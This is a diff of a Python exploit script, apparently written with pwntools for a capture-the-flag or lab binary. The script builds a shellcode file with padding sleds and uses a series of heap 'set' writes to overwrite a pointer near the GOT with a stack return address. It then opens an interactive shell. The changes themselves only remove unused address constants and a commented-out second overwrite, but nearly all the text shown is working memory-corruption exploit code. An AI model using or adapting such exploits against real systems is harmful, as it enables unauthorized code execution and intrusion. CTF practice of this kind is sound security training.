@@ -77,9 +77,6 @@ def main():
     with open("shellcode_full", "wb") as f:
         f.write(b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40)
     print('export SHELLCODE="$(cat shellcode_full)"')
-    first_addr = 0x405110
-    second_addr = 0x405120
-    gots = 0x405070
     ret_addr = 0x7fffffffe8dc
     set(r, b"1", b"A"*200)
     set(r, b"2", b"B"*200)
@@ -87,10 +84,9 @@ def main():
     set(r, b"3", b"D"*46)
     set(r, b"4", b"E"*46)
     set(r, b"4", b"F"*200) 
-    set(r, b"3", b"G"*62  + p64(ret_addr) + p64(0x405068)) # Actual overwriting happens here
+    set(r, b"3", b"G"*62 + p64(ret_addr) + p64(0x405068)) # Actual overwriting happens here
     
-    # Second overwrite
-    #set(r, b"5", b"H"*50)
+
     set(r, b"6", b"\xbb"*40 + shellcode_prev + b"\xff"*50 + shellcode + b"\xbb"*40)
     r.sendline(b"x")
     r.interactive()
